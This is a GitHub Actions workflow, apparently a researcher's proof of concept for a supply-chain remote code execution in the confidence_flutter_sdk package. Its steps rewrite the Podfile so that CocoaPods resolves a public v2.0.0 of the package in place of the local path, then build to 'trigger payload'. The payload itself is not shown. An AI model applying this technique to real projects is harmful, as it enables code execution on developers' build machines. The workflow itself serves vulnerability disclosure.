name: Supply Chain RCE Proof of Concept
on: [push, workflow_dispatch]

jobs:
  poc:
    runs-on: macos-latest
    steps:
      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Execute Full RCE Chain
        run: |
          # 1. Create dummy project
          flutter create rce_test
          cd rce_test
          flutter pub add confidence_flutter_sdk
          
          # 2. Patch Platform Version ke 16.0 (Sinkron dengan podspec)
          sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' ios/Podfile
          
          # 3. KILL Local Path Shadowing
          # Hapus logic otomatis Flutter agar tidak terkunci ke symlink lokal (:path)
          sed -i '' '/flutter_install_all_ios_pods/d' ios/Podfile
          echo "pod 'confidence_flutter_sdk'" >> ios/Podfile
          
          cd ios
          
          # === CACHE KILLER PROTOCOL ===
          echo "=== Cleaning CocoaPods Cache to Eject v1.2.4 ==="
          pod cache clean --all
          
          echo "=== Updating Repo to find v2.0.0 ==="
          pod repo update
          
          # 4. Pod Install - Resolution Phase
          # Harusnya sekarang log nunjukin: "Installing confidence_flutter_sdk 2.0.0"
          pod install --verbose 2>&1 | tee pod_install.log || true
          
          echo "=== Check Podfile.lock for version 2.0.0 ==="
          cat Podfile.lock 2>/dev/null || echo "Podfile.lock not generated"
          
          cd ..
          # 5. Build Phase - Execution Phase (Trigger Payload)
          flutter build ios --no-codesign 2>&1 | tee build.log || true
          
          echo "=== Build log tail ==="
          tail -20 build.log

      - name: Upload Logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: poc-evidence
          path: |
            rce_test/ios/pod_install.log
            rce_test/ios/Podfile.lock
            rce_test/build.log
